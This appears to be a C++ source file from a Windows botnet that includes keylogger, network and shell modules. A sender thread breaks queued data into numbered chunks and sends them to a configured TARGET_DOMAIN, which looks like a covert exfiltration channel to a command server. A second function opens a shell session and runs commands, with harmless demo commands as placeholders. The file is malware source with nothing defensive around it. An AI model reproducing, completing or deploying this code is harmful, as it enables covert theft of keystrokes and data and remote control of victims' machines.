#include "Botnet.h"
#include "KeyLogger.h"
#include "Network.h"
#include "ConsoleClient.h"
#include "Shell.h"
#include <string>

void EnqueueSend(const std::string& s) {
    std::lock_guard<std::mutex> lk(queue_mutex);
    send_queue.push(s);
}

DWORD senderBotnetThread(LPVOID lpParam)
{
    while (!should_stop_sender) {
        std::string dataToSend;

        // Check queue
        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            if (!send_queue.empty()) {
                dataToSend = send_queue.front();
                send_queue.pop();
            }
        }

        // Send data if available
        if (!dataToSend.empty()) {
            // Split dataToSend into chunks of MaxLen and send each chunk
            size_t offset = 0;
            size_t offset_number = 0;
            const size_t totalLen = dataToSend.size();
            while (offset < totalLen) {
                size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                std::string chunk = dataToSend.substr(offset, chunkLen);
                offset_number = offset % max_len;
                std::cout << packet_number;
                // TODO: kiem tra lai cho nay khi sua xong server
                int success = sendDataTypeC(connectionId, packet_number, offset_number,
                                            TARGET_DOMAIN.c_str(), chunk.c_str());

                if (success == 0) {
                    // sent OK -> increment packet number
                    packet_number++;
                    if (packet_number > 999) {
                        packet_number = 0;
                    }

                    offset += chunkLen;
                    offset_number += 1;
                    Sleep(10);
                } else {
                    // Re-enqueue remaining data
                    // std::string remaining = dataToSend.substr(offset);
                    // EnqueueSend(remaining);
                    break;
                }
            }
        } else {
            Sleep(100);
        }
    }
    return 0;
}

DWORD handle_botnet(LPVOID lpParam)
{
    HandleExec();
    return 0;
}


bool HandleExec()
{
    ConsoleClient client;
    Shell shell(&client);

    if (!shell.CreateSession()) {
        std::cerr << "Failed to create session\n";
        return true;
    }

    // Demo: send a couple commands
    shell.ExecuteCommand("echo Hello from C++");
    std::this_thread::sleep_for(std::chrono::seconds(1));
    shell.ExecuteCommand("chcp");
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // Cleanup
    shell.Dispose();
    return false;
}